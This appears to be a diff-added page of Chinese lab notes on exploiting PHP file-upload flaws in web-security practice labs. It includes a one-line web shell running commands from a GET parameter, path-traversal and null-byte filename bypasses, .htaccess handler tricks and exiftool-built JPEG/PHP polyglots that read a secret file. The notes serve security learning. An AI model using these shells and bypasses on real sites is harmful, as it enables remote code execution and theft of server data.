+<h2 id="filename">五、路径穿越：filename 里的 <code>../</code><a class="headerlink" href="#filename" title="Permanent link">&para;</a></h2>
+<h3 id="_8">作用<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p><strong>把文件从"禁止执行的上传目录"搬到"可执行的父目录"。</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">move_uploaded_file($tmp, "avatars/" . $_FILES['avatar']['name']);</span>
+</span></code></pre></div>
+<p><strong>传 <code>../shell.php</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>"avatars/" + "../shell.php"  =  "avatars/../shell.php"  =  "shell.php"
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>                                                              ↑
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>                                                        落到上一级
+</span></code></pre></div>
+<h3 id="_9">判断有没有生效<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p><strong>看上传响应里的路径：</strong></p>
+<table>
+<thead>
+<tr>
+<th>响应</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>The file **avatars/shell.php** has been uploaded</code></td>
+<td><code>../</code> 被吃掉了（<code>basename()</code> 或 <code>str_replace</code>）</td>
+</tr>
+<tr>
+<td><code>The file **avatars/../shell.php** has been uploaded</code></td>
+<td><strong>穿越成功</strong> ✅</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_10">过滤与绕过<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>过滤方式</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>str_replace('../','',$name)</code></td>
+<td><code>....//</code> → 替换后变 <code>../</code></td>
+</tr>
+<tr>
+<td>只查字面量 <code>../</code></td>
+<td><strong><code>..%2f</code></strong>（解码发生在检查之后）</td>
+</tr>
+<tr>
+<td>只拦 <code>/</code></td>
+<td><code>..%5c</code>（Windows 反斜杠）</td>
+</tr>
+<tr>
+<td><code>basename()</code></td>
+<td>❌ <strong>绕不过</strong>，这条路彻底死</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2f"><code>%2f</code> 为什么有效（经典原理）<a class="headerlink" href="#2f" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="x">if (strpos($name, '../') === false) {   // ① 检查：看到的是 ..%2f，没有 ../</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="x">    move_uploaded_file($tmp, 'avatars/' . $name);  // ② 使用：此处解码 → ../</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>检查用原始串，使用用解码串 —— 过滤发生在解码之前。</strong></p>
+<p><strong>这跟 SQL 注入里 <code>%27</code> 绕过单引号过滤是同一类漏洞。</strong></p>
+<h3 id="_11">访问时千万不要带 <code>..</code><a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>❌ /files/avatars/../shell.php   ← 浏览器/服务器会规范化，Apache 可能直接 400/404
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>✅ /files/shell.php              ← 直接写最终路径
+</span></code></pre></div>
+<p><strong><code>avatars/../shell.php</code> 退一级就是 <code>/files/shell.php</code>。</strong></p>
+<p><strong>别把"上传时的相对路径"当成"访问时的 URL"。</strong></p>
+<hr />
+<h2 id="_12">六、几个把人带偏的假象<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
+<p><strong>破法：<code>Ctrl+F5</code>，或 URL 加 <code>?t=123456</code>。</strong></p>
+<h3 id="2_1">② "图像无法正确显示"<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h3>
+<p><strong>因为服务器返回 <code>Content-Type: image/jpeg</code>（来自你 multipart 里的声明）。</strong></p>
+<p><strong>浏览器就按图片渲染，内容却是 <code>GIF89a</code> + PHP 文本 → 渲染失败。</strong></p>
+<p><strong>这不代表 PHP 没执行 —— 就算执行了，返回的也是非图片内容，一样显示不出来。</strong></p>
+<p><strong>要看响应体，不要看浏览器渲染。</strong>可以直接看burpsuite里的response</p>
+<h3 id="3_1">③ 同名文件打架<a class="headerlink" href="#3_1" title="Permanent link">&para;</a></h3>
+<p><strong>先传过 <code>aa.jpg</code>，再传 <code>aa.php</code>。</strong></p>
+<p><strong>如果 Apache 开了 <code>MultiViews</code>，访问 <code>aa.php</code> 可能被"内容协商"到 <code>aa.jpg</code> —— 你看到的其实是旧文件。</strong></p>
+<p><strong>破法：换一个全新的文件名。</strong></p>
+<h3 id="4_1">④ 上传成功了，但文件被重命名<a class="headerlink" href="#4_1" title="Permanent link">&para;</a></h3>
+<p><strong>有些程序存成随机名或 <code>avatar.jpg</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>看响应、看页面源码里的 &lt;img src&gt;
+</span></code></pre></div>
+<hr />
+<h2 id="shell">七、shell 代码本身的坑<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<p><strong>要用参数控制，就走 shell：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">          →  ?cmd=cat /home/carlos/secret</span>
+</span></code></pre></div>
+<h3 id="3_2">③ 最小验证顺序<a class="headerlink" href="#3_2" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">① </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">111</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">                 → 返回 111 → 说明能执行</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">② </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="o">...</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"> → 返回内容 → 说明路径对、权限够</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="x">③ </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">         → 任意命令 → 完整 shell</span>
+</span></code></pre></div>
+<p><strong>一次加一个变量，出问题时才知道是哪一步坏了。</strong></p>
+<hr />
+<h2 id="lab">八、六个 lab 与五个实战记录<a class="headerlink" href="#lab" title="Permanent link">&para;</a></h2>
+<h3 id="81-lab">8.1 六个 lab 对照表<a class="headerlink" href="#81-lab" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Lab</th>
+<th>考点</th>
+<th>关键动作</th>
+<th>实战</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Remote code execution via web shell upload</td>
+<td>直接传 <code>.php</code></td>
+<td>传完访问 <code>/files/avatars/x.php</code></td>
+<td>✅ 8.2</td>
+</tr>
+<tr>
+<td>Web shell upload via path traversal</td>
+<td><code>filename="../shell.php"</code></td>
+<td>文件落到上级目录</td>
+<td>✅ 8.3</td>
+</tr>
+<tr>
+<td>Web shell upload via extension blacklist bypass</td>
+<td><code>.htaccess</code> 改规则</td>
+<td><code>AddType</code> 注册新后缀</td>
+<td>✅ 8.4</td>
+</tr>
+<tr>
+<td>Web shell upload via obfuscated file extension</td>
+<td><code>%00</code> 截断</td>
+<td><code>shell.php%00.jpg</code></td>
+<td>✅ 8.5</td>
+</tr>
+<tr>
+<td>Remote code execution via polyglot web shell upload</td>
+<td>图片马</td>
+<td>真实图片 + 元数据里的 PHP</td>
+<td>✅ 8.6</td>
+</tr>
+<tr>
+<td>Web shell upload via Content-Type restriction bypass</td>
+<td>改 MIME</td>
+<td>multipart 里 <code>Content-Type: image/jpeg</code></td>
+<td>⬜ 待打</td>
+</tr>
+</tbody>
+</table>
+<p><strong>六个 lab 正好对应六个变量：后缀、路径、黑名单、截断、内容、Content-Type。</strong></p>
+<p><strong>已经实战过 5 个，只剩 Content-Type 那一个 —— 它的套路和 8.6 几乎一样，只是多改一个请求头。</strong></p>
+<p><strong>两个知识点：</strong></p>
+<p><strong>① 从响应字符串就能判断穿越成功没有：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>avatars/aa.php        → ../ 被过滤
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>avatars/../aa.php     → 穿越成功 ✅
+</span></code></pre></div>
+<p><strong>② 访问时不要带 <code>..</code>：</strong></p>
+<p><strong>URL 里的 <code>..</code> 会被规范化，Apache 还可能直接拒绝含 <code>..</code> 的请求。</strong></p>
+<p><strong>要写最终路径：<code>avatars/../aa.php</code> → <code>/files/aa.php</code>。</strong></p>
+<p><strong>③ <code>%2f</code> 为什么能过：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">if (strpos($name, '../') === false) {          // 检查：看到 ..%2f，没匹配</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="x">    move_uploaded_file($tmp, 'avatars/' . $name);  // 使用：此处才解码成 ../</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>检查用原始串，使用用解码串 —— 过滤在解码之前。</strong></p>
+<h3 id="84-3-htaccess">8.4 实战 3：扩展名黑名单 + .htaccess<a class="headerlink" href="#84-3-htaccess" title="Permanent link">&para;</a></h3>
+<p><strong>过程：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>① aa.php       → 页面提示"php 文件不允许上传"        （黑名单拦）
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>② aa.pHp5      → 上传成功，但访问只输出源码           （没有 .php5 的 handler）
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>③ ../aa.pHp5   → 报错
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>④ ..%2faa.php5 → 400 {"Invalid image file name"}     （撞上文件名字符校验）
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>⑤ 上传 .htaccess（AddType 把 .lhm 映射成 PHP）
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>⑥ 传 shell.lhm → 访问 → 执行成功 ✅
+</span></code></pre></div>
+<p><strong>每一步卡在不同层：</strong></p>
+<table>
+<thead>
+<tr>
+<th>尝试</th>
+<th>卡在哪一层</th>
+<th>报错形态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>aa.php</code></td>
+<td>② 扩展名黑名单</td>
+<td>正常页面 + 提示文字</td>
+</tr>
+<tr>
+<td><code>aa.pHp5</code></td>
+<td>③ 服务器 handler</td>
+<td><strong>200 + 源码</strong>（不报错）</td>
+</tr>
+<tr>
+<td><code>..%2faa.php5</code></td>
+<td>① 文件名字符校验</td>
+<td><strong>400 + JSON</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>结论：同一个 payload 在不同题上结果相反，因为</strong>防线不同<strong>。</strong></p>
+<h3 id="85-4">8.5 实战 4：混淆扩展名（白名单 + 截断）<a class="headerlink" href="#85-4" title="Permanent link">&para;</a></h3>
+<p><strong>题目：只允许 <code>jpg/png</code>（白名单）</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① shell.php          → 拒绝:"only jpg/png"
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>② shell.php.jpg      → 上传成功,但访问 200 + 源码 + Last-Modified → 静态
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>③ shell.php%00.jpg   → 上传成功,访问 → 执行 ✅
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>④ shell.php%20.jpg   → 也能执行(这个实现的偶然)
+</span></code></pre></div>
+<p><strong>为什么 ② 不行：两边都取最后一个后缀</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>应用白名单:  取最后 .  → jpg → 放行
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Apache:      取最后 .  → jpg → 当图片返回
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>                              ↑ 两边一致 → 静态
+</span></code></pre></div>
+<p><strong>为什么 ③ 行：NUL 是 C 语言的字符串终止符</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>应用看到的:  shell.php\0.jpg     → 以 .jpg 结尾 → 放行
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>文件系统写入: shell.php           → 读到 \0 就停
+</span></code></pre></div>
+<p><strong>校验看的是"截断前"，存储用的是"截断后" —— 不一致，所以能跑。</strong></p>
+<p><strong>④ 的 <code>%20</code>：</strong></p>
+<p><strong>这个实现里空格也被当成了截断点（可能文件名走了 shell，或某处按空白切分）。</strong></p>
+<p><strong>但它不是通用手法 —— 换个实现空格完全无效。</strong></p>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>通用性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%00</code></td>
+<td><strong>经典</strong>，老 PHP 必中（5.3.4 后修复）</td>
+</tr>
+<tr>
+<td><code>%20</code></td>
+<td><strong>偶然</strong>，依赖具体实现</td>
+</tr>
+<tr>
+<td><code>shell.php.jpg</code></td>
+<td>白名单题死路；黑名单 + 特定 Apache 配置下有时有用</td>
+</tr>
+</tbody>
+</table>
+<p><strong>你能用 <code>%20</code> 成功属于"歪打正着"，但暴露了一个有价值的思路：</strong></p>
+<blockquote>
+<p><strong>凡是"某个字符会让字符串提前结束"的地方，都可能制造"校验与使用不一致"。</strong>
+<strong><code>\0</code>、空格、换行、<code>;</code>、<code>|</code> —— 都值得试。</strong></p>
+</blockquote>
+<h3 id="86-5polyglot">8.6 实战 5：多语言文件（polyglot）<a class="headerlink" href="#86-5polyglot" title="Permanent link">&para;</a></h3>
+<p><strong>题目：上传头像，但"只接受合法图片"</strong></p>
+<p><strong>过程：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① 试各种后缀:.php / .php5 / .phtml / .php.jpg / shell.php%00.jpg ...
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>   → 全部提示"不是合法的图片"
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>② 判断:它校验的不是后缀,是【文件内容】
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>   (magic bytes / getimagesize / exif_imagetype)
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>③ 换思路:造一个"内容真的是图片"的文件
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>   exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" \
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>            photo.jpg -o shell.php
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>④ 上传 shell.php → 通过(内容是合法 JPEG)
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>⑤ 访问 /files/avatars/shell.php → 执行 → START xxx END
+</span></code></pre></div>
+<p><strong>为什么能过：同一个文件，两种合法身份</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>对图片解析器:  合法 JPEG(有 SOI 头、APP 段、EOI 尾,能正常显示)
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>对 PHP 引擎:   合法 PHP(有 &lt;?php ... ?&gt; 代码段)
+</span></code></pre></div>
+<p><strong>这就是 "polyglot"（多语言文件）—— 一个文件同时满足两种格式。</strong></p>
+<h3 id="_13">判断"查的是内容还是后缀"<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>换个后缀就被拒</td>
+<td>查<strong>后缀</strong>（黑名单 / 白名单）</td>
+</tr>
+<tr>
+<td><strong>换任何后缀都被拒</strong></td>
+<td><strong>查内容</strong></td>
+</tr>
+<tr>
+<td>换成真图片（哪怕内容是垃圾）就能过</td>
+<td>查内容（只看文件头）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>口诀：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>改后缀有效   →  查后缀
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>改后缀无效   →  查内容
+</span></code></pre></div>
+<p><strong>一旦确认查内容，继续折腾后缀就是浪费时间 —— 要换"造文件"的思路。</strong></p>
+<h3 id="polyglot">polyglot 的三种造法<a class="headerlink" href="#polyglot" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># ① exiftool 写进元数据(最常用,也最干净)</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s2">"&lt;?php ... ?&gt;"</span><span class="w"> </span>photo.jpg<span class="w"> </span>-o<span class="w"> </span>shell.php
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># ② 直接在图片尾部追加 PHP(最简单粗暴)</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>copy<span class="w"> </span>/b<span class="w"> </span>photo.jpg<span class="w"> </span>+<span class="w"> </span>shell.php<span class="w"> </span>shell.jpg<span class="w">      </span><span class="c1"># Windows</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>cat<span class="w"> </span>photo.jpg<span class="w"> </span>shell.php<span class="w"> </span>&gt;<span class="w"> </span>shell.jpg<span class="w">          </span><span class="c1"># Linux</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="c1"># ③ 配合 .htaccess,让 .jpg 也执行(见 8.4)</span>
+</span></code></pre></div>
+<p><strong>① 的优点：图片元数据本来就是"允许有任意文本"的地方，不会破坏图片结构。</strong></p>
+<h3 id="php-start-end">为什么 PHP 代码里要加 START / END<a class="headerlink" href="#php-start-end" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s1">'START '</span> <span class="o">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/home/carlos/secret'</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' END'</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</span></code></pre></div>
+<p><strong>因为 PHP 会把 <code>&lt;?php ?&gt;</code> <strong>之外</strong>的内容原样输出。</strong></p>
+<p><strong>这个文件是一整张 JPEG，执行时响应体是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ÿØÿà JFIF ... 几万字节的图片二进制 ... START 秘密内容 END
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>                                        └────┬────┘
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>                                          好搜
+</span></code></pre></div>
+<p><strong>没有标记，秘密就混在二进制垃圾里，肉眼找不到。</strong></p>
+<hr />
+<h2 id="_14">九、三道防线模型（最重要的一节）<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
+<p><strong>上传题永远是这三道门，任何一道没过，都表现为"上传成功但拿不到 shell"。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>┌─────────────────────────────────────────────┐
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>│ ① 文件名格式校验                              │
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>│    正则:^[a-zA-Z0-9._-]+$                     │
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>│    拦:`/` `%2f` `..` `中文` `空格`            │
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>│    报错:400 + JSON                            │
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>├─────────────────────────────────────────────┤
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>│ ② 扩展名黑 / 白名单                           │
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>│    拦: .php .phtml .php3 ...                  │
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>│    报错:正常页面 + "不允许上传"                │
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>├─────────────────────────────────────────────┤
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>│ ③ Web 服务器有没有该后缀的 handler            │
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>│    没有 → 当静态文件返回                       │
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>│    报错:无（200 + 源码，最容易误判）           │
+</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>└─────────────────────────────────────────────┘
+</span></code></pre></div>
+<h3 id="91">9.1 四种报错形态 ↔ 四层问题<a class="headerlink" href="#91" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>你看到的</th>
+<th>在哪一层</th>
+<th>该动哪里</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>400 + JSON</strong></td>
+<td><strong>应用层格式校验</strong></td>
+<td>换文件名（去掉 <code>/</code> 等非法字符）</td>
+</tr>
+<tr>
+<td><strong>正常页面 + "不允许"</strong></td>
+<td><strong>应用层扩展名校验</strong></td>
+<td>换后缀 / <code>.htaccess</code></td>
+</tr>
+<tr>
+<td><strong>403</strong></td>
+<td>权限 / 目录禁止</td>
+<td>换目录或换访问方式</td>
+</tr>
+<tr>
+<td><strong>200 + 源码</strong></td>
+<td><strong>服务器 handler 缺失</strong></td>
+<td>换一个真有 handler 的后缀</td>
+</tr>
+<tr>
+<td><strong>200 + 代码输出</strong></td>
+<td>✅ 成功</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>这张表是排查上传题的入口 —— 先看报错形态，就知道卡在第几道门。</strong></p>
+<h3 id="92">9.2 三道门用的"同一招"<a class="headerlink" href="#92" title="Permanent link">&para;</a></h3>
+<p><strong>"能上传"和"能执行"是两件事：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>过了 ① ② → 文件存下来了
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>过了 ③   → 文件才会被执行
+</span></code></pre></div>
+<p><strong><code>.php5</code> 过了 ①②，死在 ③ —— 这就是"上传成功但只返回源码"的本质。</strong></p>
+<p><strong>所以看到"源码原样返回"时，不要再改后缀字母大小写了，要问：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>这个后缀,Apache 到底认不认?
+</span></code></pre></div>
+<h2 id="_15">十、通用模型：解析器不一致<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h2>
+<h2 id="_16">十一、我踩的坑（实践版）<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h2>
+<h3 id="1invalid-image-file-name">坑 1：把"Invalid image file name"理解成"内容不是图片"<a class="headerlink" href="#1invalid-image-file-name" title="Permanent link">&para;</a></h3>
+<p><strong>报错里写的是 <code>name</code>，校验的是</strong>文件名字符串<strong>，不是文件内容。</strong></p>
+<p><strong><code>%2f</code> 解码成 <code>/</code> → 不在字符白名单里 → 400。</strong></p>
+<p><strong><code>avatars/</code> 是服务端拼的目录前缀，不参与校验 —— 别以为它在被检查。</strong></p>
+<h3 id="2-php5">坑 2：以为 <code>.php5</code> 上传成功就能执行<a class="headerlink" href="#2-php5" title="Permanent link">&para;</a></h3>
+<p><strong>能上传 ≠ 能执行。</strong></p>
+<p><strong>黑名单只管"不许传什么"，不管"传了能不能跑"。</strong></p>
+<p><strong><code>.php5</code> 在很多 Apache 配置里根本没有 handler → 当静态文件返回。</strong></p>
+<h3 id="6-304">坑 6：把 304 当成错误<a class="headerlink" href="#6-304" title="Permanent link">&para;</a></h3>
+<p><strong>304 = 缓存协商，响应体是空的，你看到的是</strong>旧缓存<strong>。</strong></p>
+<p><strong>破法：<code>Ctrl+F5</code> 或 URL 加 <code>?t=随机数</code>。</strong></p>
+<h3 id="7">坑 7：把"图像无法显示"当成"没执行"<a class="headerlink" href="#7" title="Permanent link">&para;</a></h3>
+<p><strong>服务器按 <code>Content-Type: image/jpeg</code> 返回，浏览器按图片渲染失败。</strong></p>
+<p><strong>就算 PHP 执行了，输出也不是合法图片，照样显示不出来。</strong></p>
+<p><strong>判断要看响应体，不看浏览器渲染。</strong></p>
+<h3 id="8">坑 8：不知道用响应头判断"执行了没"<a class="headerlink" href="#8" title="Permanent link">&para;</a></h3>
+<p><strong>最可靠的三个信号：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Last-Modified + Accept-Ranges: bytes  →  静态文件（没执行）
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>Content-Length = 你上传文件的字节数    →  原样吐出（没执行）
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>响应体里代码被替换成输出              →  执行了 ✅
+</span></code></pre></div>
